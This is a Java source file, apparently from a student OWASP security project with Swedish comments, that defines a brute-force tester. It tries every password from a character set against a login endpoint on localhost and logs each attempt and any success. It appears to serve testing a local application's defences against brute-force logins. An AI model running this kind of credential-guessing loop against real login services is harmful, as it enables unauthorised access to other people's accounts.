package com.example.owaspkryptering.PasswordBreachTest;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.slf4j.LoggerFactory;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

import java.util.logging.Logger;

public class BruteForceTester {

    static Logger logger = Logger.getLogger(BruteForceTester.class.getName());

    private static final PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();


        public static void main(String[] args) throws Exception {
            CloseableHttpClient httpClient = HttpClients.createDefault();

            String targetUrl = "http://localhost:8080/login"; // Serveradress och endpoint
            String targetUsername = "one@test.se"; // Användarnamn att testa
            String characters = "abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWÅÄÖ0123456789"; // Tecken som kan ingå
            int maxLength = 1; // Maximal längd på lösenordet

            // Timing
            long startTime = System.currentTimeMillis(); // Starta tidtagning

            logger.info("Starting brute force attack...");
            boolean success = bruteForceLoop(targetUsername, characters, maxLength, httpClient, targetUrl);

            long endTime = System.currentTimeMillis(); // Avsluta tidtagning
            long totalTime = endTime - startTime;

            if (success) {
                logger.info("Password cracked successfully!");
            } else {
                logger.info("Brute force attack finished. Password not cracked.");
            }

            logger.info("Time taken: " + totalTime + " milliseconds");

            httpClient.close(); // Stäng HTTP-klienten när du är klar
        }

        private static boolean bruteForceLoop(String targetUsername, String characters, int maxLength, CloseableHttpClient httpClient, String targetUrl) throws Exception {
            for (int length = 1; length <= maxLength; length++) {
                if (bruteForceRecursive("", characters, length, targetUsername, httpClient, targetUrl)) {
                    return true;
                }
            }
            return false;
        }

        private static synchronized boolean bruteForceRecursive(String currentPassword, String characters, int length, String targetUsername, CloseableHttpClient httpClient, String targetUrl) throws Exception {
            if (length == 0) {
                String json = "{\"username\": \"" + targetUsername + "\", \"password\": \"" + currentPassword + "\"}";

                HttpPost httpPost = new HttpPost(targetUrl);
                httpPost.setEntity(new StringEntity(json));
                httpPost.setHeader("Accept", "*/*");
                httpPost.setHeader("Content-type", "application/json");

                int statusCode = httpClient.execute(httpPost).getStatusLine().getStatusCode();
                if (statusCode == 200) {
                    logger.info("Login successful for user: " + targetUsername + " with password: " + currentPassword);
                    return true;
                }
                logger.info("Login failed for user: " + targetUsername + " with password: " + currentPassword); // kommentera ut om längre lösenord ska testas
                return false;
            }

            for (char c : characters.toCharArray()) {
                if (bruteForceRecursive(currentPassword + c, characters, length - 1, targetUsername, httpClient, targetUrl)) {
                    return true;
                }
            }
            return false;
        }
    }








